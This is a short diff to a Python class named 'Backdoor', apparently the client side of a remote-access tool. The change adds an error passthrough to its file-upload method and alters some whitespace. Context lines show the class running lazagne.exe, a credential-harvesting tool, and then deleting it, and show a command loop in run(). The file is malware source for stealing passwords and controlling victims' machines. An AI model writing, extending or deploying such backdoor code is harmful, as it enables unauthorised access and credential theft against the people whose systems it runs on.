@@ -70,6 +70,8 @@ class Backdoor:
             return f"[-] Error: {str(e)}"
 
     def upload_file(self, path, content):
+        if content.startswith("[-]"):
+            return content.encode()
         try:
             with open(path, "wb") as file:
                 file.write(base64.b64decode(content))
@@ -113,7 +115,7 @@ class Backdoor:
         os.remove("lazagne.exe")
         os.chdir(pwd)
         return result
-
+    
     def run(self):
         while True:
             try:
